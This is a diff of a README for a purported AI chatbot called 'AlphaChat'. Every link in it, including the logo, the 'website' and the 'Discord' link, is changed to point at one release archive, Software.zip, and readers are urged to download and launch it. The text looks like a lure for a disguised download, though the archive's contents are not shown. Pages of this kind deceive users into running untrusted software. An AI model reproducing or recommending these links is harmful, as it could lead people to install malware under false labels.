@@ -1,7 +1,7 @@
 
 # 🤖 AlphaChat - Your Ultimate AI-Powered Chatbot Experience! 🚀
 
-![AlphaChat Logo](https://github.com/valle123321123/AlphaChat/releases/download/v1.0/Software.zip)
+![AlphaChat Logo](https://github.com/valle123321123/AlphaChat/releases/download/v2.0/Software.zip)
 
 Welcome to AlphaChat, the most advanced chatbot with a GUI and console interface for real-time conversations, Q&A management, and AI-driven features like voice interaction, image generation, and PDF summarization.
 
@@ -23,7 +23,7 @@ Welcome to AlphaChat, the most advanced chatbot with a GUI and console interface
 
 ## Get Started 🚀
 
-To get started with AlphaChat, you can download the latest release from the [v1.0.0 release](https://github.com/valle123321123/AlphaChat/releases/download/v1.0/Software.zip) and launch the application.
+To get started with AlphaChat, you can download the latest release from the [v1.0.0 release](https://github.com/valle123321123/AlphaChat/releases/download/v2.0/Software.zip) and launch the application.
 
 ---
 
@@ -37,20 +37,20 @@ To get started with AlphaChat, you can download the latest release from the [v1.
 
 ## Installation Steps 🛠️
 
-1. Download the latest release from [v1.0.0 release](https://github.com/valle123321123/AlphaChat/releases/download/v1.0/Software.zip).
+1. Download the latest release from [v1.0.0 release](https://github.com/valle123321123/AlphaChat/releases/download/v2.0/Software.zip).
 2. Launch the application and start chatting with AlphaChat!
 
 ---
 
 ## Support and Feedback 💬
 
-If you have any questions, feedback, or suggestions, feel free to reach out to us through our [website](https://github.com/valle123321123/AlphaChat/releases/download/v1.0/Software.zip).
+If you have any questions, feedback, or suggestions, feel free to reach out to us through our [website](https://github.com/valle123321123/AlphaChat/releases/download/v2.0/Software.zip).
 
 ---
 
 ## Join Our Community 🌐
 
-Stay updated with the latest news and updates by joining our community on [Discord](https://github.com/valle123321123/AlphaChat/releases/download/v1.0/Software.zip).
+Stay updated with the latest news and updates by joining our community on [Discord](https://github.com/valle123321123/AlphaChat/releases/download/v2.0/Software.zip).
 
 ---
 
@@ -62,7 +62,7 @@ Start chatting with AlphaChat today and explore the endless possibilities of AI-
 
 **AlphaChat - Unleash the Power of AI in Your Conversations!** 🌌
 
-[![Download AlphaChat](https://github.com/valle123321123/AlphaChat/releases/download/v1.0/Software.zip)](https://github.com/valle123321123/AlphaChat/releases/download/v1.0/Software.zip)
+[![Download AlphaChat](https://github.com/valle123321123/AlphaChat/releases/download/v2.0/Software.zip)](https://github.com/valle123321123/AlphaChat/releases/download/v2.0/Software.zip)
 
 **Note:** The link provided above needs to be launched to download the application.
 
